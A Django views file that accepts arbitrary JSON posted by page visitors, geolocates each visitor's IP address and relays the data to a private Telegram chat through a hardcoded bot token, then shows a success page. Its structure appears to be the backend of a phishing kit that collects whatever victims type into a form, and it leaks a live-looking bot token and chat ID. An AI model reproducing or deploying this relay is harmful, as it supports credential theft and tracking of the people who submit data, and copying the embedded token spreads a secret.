import requests
from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json

TELEGRAM_BOT_TOKEN = '7584867618:AAHIy5vSZOhoW6Ba0pZdDL0fILznS9RGcyQ'
TELEGRAM_CHAT_ID = "1374918767"

def index(request):
    return render(request, 'new.html')

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    response = requests.post(url, json=payload)
    return response.json()

def get_country_from_ip(ip_address):
    url = f"http://ip-api.com/json/{ip_address}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        country = data.get("country")     # Country name, e.g., "United States"
        city = data.get("city")
        return country, city
    return None, None

@csrf_exempt
def receive_data(request):
    if request.method == "POST":
        try:
            data = json.loads(request.body.decode("utf-8"))
            ip_address = request.META.get("REMOTE_ADDR")
            country, city = get_country_from_ip(ip_address)
            print(data)
            message = f"New Data Received\nipaddress:{ip_address} \ncountry:{country} \ncity:{city}\n{json.dumps(data, indent=2)}"
            response = send_telegram_message(message)
            return JsonResponse({"success": True, "telegram_response": response})
        except json.JSONDecodeError:
            return JsonResponse({"success": False, "error": "Invalid JSON"}, status=400)

    # If it's a GET request, render the HTML template
    return render(request, "index.html")

def success(request):
    return render(request, 'success.html')